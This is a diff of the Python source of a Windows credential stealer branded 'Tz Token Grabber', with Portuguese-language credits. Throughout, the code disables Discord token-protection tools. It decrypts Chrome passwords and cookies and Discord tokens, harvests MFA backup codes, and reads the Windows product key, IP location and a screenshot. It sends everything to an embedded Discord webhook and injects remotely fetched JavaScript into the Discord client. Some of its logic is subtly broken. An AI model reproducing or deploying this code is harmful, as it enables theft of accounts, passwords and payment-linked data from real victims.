@@ -1,3 +1,7 @@
+#*********************************************************************#
+#codificado por 🜲 Oi, eu sou o Tz#0001 | https://instagram.com/tzfofo#
+#*********************************************************************#
+
 import os
 import requests
 import shutil
@@ -6,7 +10,9 @@ import zipfile
 import json
 import base64 
 import psutil
+import winreg
 
+from threading import Thread
 from PIL import ImageGrab
 from win32crypt import CryptUnprotectData
 from re import findall
@@ -14,12 +20,15 @@ from Crypto.Cipher import AES
 
 class Tz_Token_Grabber:
     def __init__(self):
-        self.webhook = "SUA_WEBHOOK"
+        self.webhook = "https://discord.com/api/webhooks/953714975501869106/HSHEJfMSOHUa1VlUiVrGZGfxnbVu1WtFx86IXY1nI5mf8UNdMnusSSLNIuNY4CNEpxuf"
         self.files = ""
+
+        self.baseurl = "https://discord.com/api/v9/users/@me"
         self.appdata = os.getenv("localappdata")
         self.roaming = os.getenv("appdata")
         self.tempfolder = os.getenv("temp")+"\\Tz_Token_Grabber"
         self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"
+        self.encrypted_regex = r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$]{120}"
 
         try:
             os.mkdir(os.path.join(self.tempfolder))
@@ -30,29 +39,27 @@ class Tz_Token_Grabber:
         self.discord_psw = []
         self.backup_codes = []
         
-        if os.path.exists(self.roaming+"\\BetterDiscord\\data\\betterdiscord.asar"):
-            self.bypass_better_discord()
-
-        if not os.path.exists(self.appdata+'\\Google'):
+        self.bypassBetterDiscord()
+        self.bypassTokenProtector()
+        if not os.path.exists(self.appdata+'\\Google\\Chrome\\User Data') or not os.path.exists(self.appdata+'\\Google\\Chrome\\User Data\\Local State'):
             self.files += f"{os.getlogin()} doesn't have google installed\n"
         else:
             self.grabPassword()
             self.grabCookies()
+        Thread(target=self.screenshot).start()
+        Thread(target=self.killDiscord).start()
         self.grabTokens()
         self.neatifyTokens()
-        self.screenshot()
         for i in ["Google Passwords.txt", "Google Cookies.txt", "Discord Info.txt", "Discord backupCodes.txt"]:
             if os.path.exists(self.tempfolder+os.sep+i):
-                with open(self.tempfolder+os.sep+i, "r", encoding="cp437") as f:
-                    x = f.read()
-                    if x != "":
+                with open(self.tempfolder+os.sep+i, "r", encoding="cp437") as ff:
+                    x = ff.read()
+                    if not x:
                         with open(self.tempfolder+os.sep+i, "w", encoding="cp437") as f:
-                            f.write("Feito por Tz | https://instagram/tzfofo\n\n")
+                            f.write("Feito por Tz | https://instagram.com/tzfofo\n\n")
                         with open(self.tempfolder+os.sep+i, "a", encoding="cp437") as fp:
-                            fp.write(x)
-                            fp.write("\n\nFeito por Tz | https://instagram/tzfofo")
+                            fp.write(x+"\n\nFeito por Tz | https://instagram.com/tzfofo")
                     else:
-                        f.close()
                         try:
                             os.remove(self.tempfolder+os.sep+i)
                         except Exception:
@@ -60,11 +67,8 @@ class Tz_Token_Grabber:
 
         self.SendInfo()
         self.Injection()
-        try:
-            shutil.rmtree(self.tempfolder)
-        except (PermissionError, FileNotFoundError):
-            pass
-
+        shutil.rmtree(self.tempfolder)
+        
     def getheaders(self, token=None, content_type="application/json"):
         headers = {
             "Content-Type": content_type,
@@ -75,13 +79,6 @@ class Tz_Token_Grabber:
         return headers
 
     def Injection(self):
-        for proc in psutil.process_iter():
-            if any(procstr in proc.name().lower() for procstr in\
-            ['discord', 'discordcanary', 'discorddevelopment', 'discordptb']):
-                try:
-                    proc.kill()
-                except psutil.NoSuchProcess:
-                    pass
         for root, dirs, files in os.walk(self.appdata):
             for name in dirs:
                 if "discord_desktop_core-" in name:
@@ -89,7 +86,7 @@ class Tz_Token_Grabber:
                         directory_list = os.path.join(root, name+"\\discord_desktop_core\\index.js")
                     except FileNotFoundError:
                         pass
-                    f = requests.get("https://raw.githubusercontent.com/Tz1337/injection/main/Injection").text.replace("%WEBHOOK_LINK%", self.webhook)
+                    f = requests.get("https://raw.githubusercontent.com/Tzputao/injection/main/Injection").text.replace("%WEBHOOK_LINK%", self.webhook)
                     with open(directory_list, 'w', encoding="utf-8") as index_file:
                         index_file.write(f)
         for root, dirs, files in os.walk(self.roaming+"\\Microsoft\\Windows\\Start Menu\\Programs\\Discord Inc"):
@@ -97,9 +94,7 @@ class Tz_Token_Grabber:
                 discord_file = os.path.join(root, name)
                 os.startfile(discord_file)
 
-    def bypass_token_protector(self):
-        #fode o protetor de token feito por https://github.com/andro2157/DiscordTokenProtector
-        tp = f"{self.roaming}\\DiscordTokenProtector\\"
+    def killDiscord(self):
         for proc in psutil.process_iter():
             if any(procstr in proc.name().lower() for procstr in\
             ['discord', 'discordtokenprotector', 'discordcanary', 'discorddevelopment', 'discordptb']):
@@ -107,13 +102,18 @@ class Tz_Token_Grabber:
                     proc.kill()
                 except psutil.NoSuchProcess:
                     pass
+
+    def bypassTokenProtector(self):
+        #fode o protetor de token feito por https://github.com/andro2157/DiscordTokenProtector
+        tp = f"{self.roaming}\\DiscordTokenProtector\\"
+        config = tp+"config.json"
         for i in ["DiscordTokenProtector.exe", "ProtectionPayload.dll", "secure.dat"]:
             try:
                 os.remove(tp+i)
             except Exception:
                 pass 
         try:
-            with open(tp+"config.json") as f:
+            with open(config) as f:
                 item = json.load(f)
                 item['auto_start'] = False
                 item['auto_start_discord'] = False
@@ -129,25 +129,59 @@ class Tz_Token_Grabber:
                 item['iterations_key'] = 457
                 item['version'] = 69420
 
-            with open(tp+"config.json", 'w') as f:
+            with open(config, 'w') as f:
                 json.dump(item, f, indent=2, sort_keys=True)
 
-            with open(tp+"config.json", 'a') as f:
-                f.write("\n\n//Tz apenas cagou nesse protetor de token | https://instagram.com/tzfofo")
+            with open(config, 'a') as f:
+                f.write("\n\n//Rdimo apenas cagou nesse protetor de token | https://github.com/Tzputao")
         except Exception:
             pass
 
-    def bypass_better_discord(self):
+    def bypassBetterDiscord(self):
         bd = self.roaming+"\\BetterDiscord\\data\\betterdiscord.asar"
-        with open(bd, "rt", encoding="cp437") as f:
-            content = f.read()
-            content2 = content.replace("api/webhooks", "Tzfofo")
-        with open(bd, 'w'): pass
-        with open(bd, "wt", encoding="cp437") as f:
-            f.write(content2)
+        if os.path.exists(bd):
+            x = "api/webhooks"
+            with open(bd, "r+", errors="ignore") as f:
+                l = f.readlines()
+                for i in l:
+                    if x in i:
+                        Replacement = i.replace(x, "@tzfofo")
+                        l = Replacement
+                f.writelines(l)
 
-    def get_master_key(self):
-        with open(self.appdata+'\\Google\\Chrome\\User Data\\Local State', "r", encoding="utf-8") as f:
+    def getProductKey(self, path: str = r'SOFTWARE\Microsoft\Windows NT\CurrentVersion'):
+        def strToInt(x):
+            if isinstance(x, str):
+                return ord(x)
+            return x
+        chars = 'BCDFGHJKMPQRTVWXY2346789'
+        wkey = ''
+        offset = 52
+        regkey = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,path)
+        val, _ = winreg.QueryValueEx(regkey, 'DigitalProductId')
+        productName, _ = winreg.QueryValueEx(regkey, "ProductName")
+        key = list(val)
+
+        for i in range(24,-1, -1):
+            temp = 0
+            for j in range(14,-1,-1):
+                temp *= 256
+                try:
+                    temp += strToInt(key[j+ offset])
+                except IndexError:
+                    return [productName, ""]
+                if temp / 24 <= 255:
+                    key[j+ offset] = temp/24
+                else:
+                    key[j+ offset] = 255
+                temp = int(temp % 24)
+            wkey = chars[temp] + wkey
+        for i in range(5,len(wkey),6):
+            wkey = wkey[:i] + '-' + wkey[i:]
+        return [productName, wkey]
+
+    def get_master_key(self, path):
+        with open(path, "r", encoding="utf-8") as f:
             local_state = f.read()
         local_state = json.loads(local_state)
 
@@ -170,15 +204,15 @@ class Tz_Token_Grabber:
             decrypted_pass = self.decrypt_payload(cipher, payload)
             decrypted_pass = decrypted_pass[:-16].decode()
             return decrypted_pass
-        except:
-            return "Chrome < 80"
+        except Exception:
+            return "Failed to decrypt password"
     
     def grabPassword(self):
-        master_key = self.get_master_key()
+        master_key = self.get_master_key(self.appdata+'\\Google\\Chrome\\User Data\\Local State')
         login_db = self.appdata+'\\Google\\Chrome\\User Data\\default\\Login Data'
         try:
             shutil.copy2(login_db, "Loginvault.db")
-        except FileNotFoundError:
+        except Exception:
             pass
         conn = sqlite3.connect("Loginvault.db")
         cursor = conn.cursor()
@@ -194,21 +228,21 @@ class Tz_Token_Grabber:
                         f.write(f"Domain: {url}\nUser: {username}\nPass: {decrypted_password}\n\n")
                         if "discord" in url.lower():
                             self.discord_psw.append(decrypted_password)
-            except:
+            except Exception:
                 pass
         cursor.close()
         conn.close()
         try:
             os.remove("Loginvault.db")
-        except:
+        except Exception:
             pass
 
     def grabCookies(self):
-        master_key = self.get_master_key()
+        master_key = self.get_master_key(self.appdata+'\\Google\\Chrome\\User Data\\Local State')
         login_db = self.appdata+'\\Google\\Chrome\\User Data\\default\\Network\\cookies'
         try:
             shutil.copy2(login_db, "Loginvault.db")
-        except FileNotFoundError:
+        except Exception:
             pass
         conn = sqlite3.connect("Loginvault.db")
         cursor = conn.cursor()
@@ -216,19 +250,19 @@ class Tz_Token_Grabber:
             try:
                 cursor.execute("SELECT host_key, name, encrypted_value from cookies")
                 for r in cursor.fetchall():
-                    Host = r[0]
+                    host = r[0]
                     user = r[1]
                     encrypted_cookie = r[2]
                     decrypted_cookie = self.decrypt_password(encrypted_cookie, master_key)
-                    if Host != "":
-                        f.write(f"Host: {Host}\nUser: {user}\nCookie: {decrypted_cookie}\n\n")
-            except:
+                    if host != "":
+                        f.write(f"Host: {host}\nUser: {user}\nCookie: {decrypted_cookie}\n\n")
+            except Exception:
                 pass
         cursor.close()
         conn.close()
         try:
             os.remove("Loginvault.db")
-        except:
+        except Exception:
             pass
 
     def grabTokens(self):
@@ -256,26 +290,41 @@ class Tz_Token_Grabber:
             'Brave': self.appdata + r'\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
             'Iridium': self.appdata + r'\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
         }
-
-        for source, path in paths.items():
+        
+        for _, path in paths.items():
             if not os.path.exists(path):
                 continue
-            for file_name in os.listdir(path):
-                if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
-                    continue
-                for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
-                    for regex in (self.regex):
-                        for token in findall(regex, line):
-                            try:
-                                r = requests.get("https://discord.com/api/v9/users/@me", headers=self.getheaders(token))
-                            except Exception:
-                                pass
-                            if r.status_code == 200:
-                                if token in self.tokens:
-                                    continue
-                                self.tokens.append(token)
+            if not "discord" in path:
+                for file_name in os.listdir(path):
+                    if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
+                        continue
+                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+                        for regex in (self.regex):
+                            for token in findall(regex, line):
+                                try:
+                                    r = requests.get(self.baseurl, headers=self.getheaders(token))
+                                    if r.status_code == 200:
+                                        if token in self.tokens:
+                                            continue
+                                except Exception:
+                                    pass
+                                    self.tokens.append(token)
+            else:
+                if os.path.exists(self.roaming+'\\discord\\Local State'):
+                    for file_name in os.listdir(path):
+                        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
+                            continue
+                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+                            for y in findall(self.encrypted_regex, line):
+                                token = self.decrypt_password(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming+'\\discord\\Local State'))
+                                r = requests.get(self.baseurl, headers=self.getheaders(token))
+                                if r.status_code == 200:
+                                    if token in self.tokens:
+                                        continue
+                                    self.tokens.append(token)
+
         if os.path.exists(os.getenv("appdata")+"\\Mozilla\\Firefox\\Profiles"):
-            for path, subdirs, files in os.walk(os.getenv("appdata")+"\\Mozilla\\Firefox\\Profiles"):
+            for path, _, files in os.walk(os.getenv("appdata")+"\\Mozilla\\Firefox\\Profiles"):
                 for _file in files:
                     if not _file.endswith('.sqlite'):
                         continue
@@ -283,33 +332,31 @@ class Tz_Token_Grabber:
                         for regex in (self.regex):
                             for token in findall(regex, line):
                                 try:
-                                    r = requests.get("https://discord.com/api/v9/users/@me", headers=self.getheaders(token))
+                                    r = requests.get(self.baseurl, headers=self.getheaders(token))
                                 except Exception:
                                     pass
                                 if r.status_code == 200:
                                     if token in self.tokens:
                                         continue
                                     self.tokens.append(token)
-                                    
+                                    print(token)
+              
     def neatifyTokens(self):
         f = open(self.tempfolder+"\\Informações do discord.txt", "w", encoding="cp437", errors='ignore')
         for token in self.tokens:
-            try:
-                j = requests.get("https://discord.com/api/v9/users/@me", headers=self.getheaders(token)).json()
-            except Exception:
-                pass
-            user = j["username"] + "#" + str(j["discriminator"])
+            j = requests.get(self.baseurl, headers=self.getheaders(token)).json()
+            user = j.get('username') + '#' + str(j.get("discriminator"))
 
             if token.startswith("mfa.") and self.discord_psw:
                 with open(self.tempfolder+os.sep+"Discord backupCodes.txt", "a", errors="ignore") as fp:
                     fp.write(f"{user} Backup Codes".center(36, "-")+"\n")
                     for x in self.discord_psw:
                         try:
-                            r = requests.post("https://discord.com/api/v9/users/@me/mfa/codes", headers=self.getheaders(token), json={"password": x, "regenerate": False}).json()
-                            for i in r["backup_codes"]:
+                            r = requests.post(self.baseurl+"/mfa/codes", headers=self.getheaders(token), json={"password": x, "regenerate": False}).json()
+                            for i in r.get("backup_codes"):
                                 if i not in self.backup_codes:
                                     self.backup_codes.append(i)
-                                    fp.write(f'\t{i["code"]} | {"Already used" if i["consumed"] == True else "Not used"}\n')
+                                    fp.write(f'\t{i.get("code")} | {"Already used" if i.get("consumed") == True else "Not used"}\n')
                         except Exception:
                             pass
             badges = ""
@@ -325,20 +372,19 @@ class Tz_Token_Grabber:
             if (flags == 16384): badges += "Gold BugHunter, "
             if (flags == 131072): badges += "Verified Bot Developer, "
             if (badges == ""): badges = "None"
-            user = j["username"] + "#" + str(j["discriminator"])
-            email = j["email"]
-            phone = j["phone"] if j["phone"] else "Nenhum número de telefone anexado"
+            email = j.get("email")
+            phone = j.get("phone") if j.get("phone") else "No Phone Number attached"
             try:
-                nitro_data = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=self.getheaders(token)).json()
+                nitro_data = requests.get(self.baseurl+'/billing/subscriptions', headers=self.getheaders(token)).json()
             except Exception:
                 pass
             has_nitro = False
             has_nitro = bool(len(nitro_data) > 0)
             try:
-                billing = bool(len(json.loads(requests.get("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=self.getheaders(token)).text)) > 0)
+                billing = bool(len(json.loads(requests.get(self.baseurl+"/billing/payment-sources", headers=self.getheaders(token)).text)) > 0)
             except Exception:
                 pass
-            f.write(f"{' '*17}{user}\n{'-'*50}\nToken: {token}\nTem Faturamento: {billing}\nNitro: {has_nitro}\nBadges: {badges}\nEmail: {email}\nTelefone: {phone}\n\n")
+            f.write(f"{' '*17}{user}\n{'-'*50}\nToken: {token}\nFaturamento: {billing}\nNitro: {has_nitro}\nBadges: {badges}\nEmail: {email}\nTelefone: {phone}\n\n")
         f.close()
 
     def screenshot(self):
@@ -352,10 +398,11 @@ class Tz_Token_Grabber:
         image.close()
 
     def SendInfo(self):
-        wkey = os.popen("wmic path softwarelicensingservice get OA3xOriginalProductKey").read().strip("OA3xOriginalProductKeyn\n").strip()
+        wname = self.getProductKey()[0]
+        wkey = self.getProductKey()[1]
         ip = country = city = region = googlemap = "None"
         try:
-            data = requests.get("http://ipinfo.io/json").json()
+            data = requests.get("https://ipinfo.io/json").json()
             ip = data['ip']
             city = data['city']
             country = data['country']
@@ -363,7 +410,7 @@ class Tz_Token_Grabber:
             googlemap = "https://www.google.com/maps/search/google+map++" + data['loc']
         except Exception:
             pass
-        _zipfile = os.path.join(self.appdata, f'Tz-[{os.getlogin()}].zip')
+        _zipfile = os.path.join(self.appdata, f'Tz.-[{os.getlogin()}].zip')
         zipped_file = zipfile.ZipFile(_zipfile, "w", zipfile.ZIP_DEFLATED)
         abs_src = os.path.abspath(self.tempfolder)
         for dirname, _, files in os.walk(self.tempfolder):
@@ -376,25 +423,24 @@ class Tz_Token_Grabber:
         for f in files:
             self.files += f"\n{f}"
         self.fileCount = f"{len(files)} Arquivos encontrados: "
-        backslash = "\n"
         embed = {
-            "avatar_url":"https://cdn.discordapp.com/attachments/828047793619861557/891537255078985819/nedladdning_9.gif",
+            "avatar_url":"https://raw.githubusercontent.com/Rdimo/images/master/Hazard-Token-Grabber-V2/Big_hazard.gif",
             "embeds": [
                 {
                     "author": {
-                        "name": "Tz",
+                        "name": "Tz Token Grabber",
                         "url": "https://instagram.com/tzfofo",
-                        "icon_url": "https://cdn.discordapp.com/attachments/939081376802689095/942016924370493440/Small_Tz.gif"
+                        "icon_url": "https://raw.githubusercontent.com/Rdimo/images/master/Hazard-Token-Grabber-V2/Small_hazard.gif"
                     },
-                    "description": f'**{os.getlogin()}** Acabei de executar o Tz Token Grabber e me fudi :)\n```fix\nNome do Computador: {os.getenv("COMPUTERNAME")}{backslash+"Chave do Windows: "+wkey if wkey else ""}\nIP: {ip}\nCidade: {city}\nRegião: {region}\nPaís: {country}```[Localização do Google Maps]({googlemap})\n```fix\n{self.fileCount}{self.files}```',
-                    "color": 16119101,
+                    "description": f'**{os.getlogin()}** Acabei de executar o Grabber do Tz\n```fix\nNome do computador: {os.getenv("COMPUTERNAME")}\n{wname}: {wkey if wkey else "No Product Key"}\nIP: {ip}\nCidade: {city}\nRegião: {region}\nPaís: {country}```[Google Maps Location]({googlemap})\n```fix\n{self.fileCount}{self.files}```',
+                    "color": 1752220,
 
                     "thumbnail": {
-                      "url": "https://cdn.discordapp.com/attachments/828047793619861557/891537255078985819/nedladdning_9.gif"
+                      "url": "https://raw.githubusercontent.com/Rdimo/images/master/Hazard-Token-Grabber-V2/Hazard.gif"
                     },       
 
                     "footer": {
-                      "text": "©Tz | https://instagram.com/tzfofo"
+                      "text": "🜲 Oi, eu sou o Tz#0001 https://instagram.com/tzfofo"
                     }
                 }
             ]
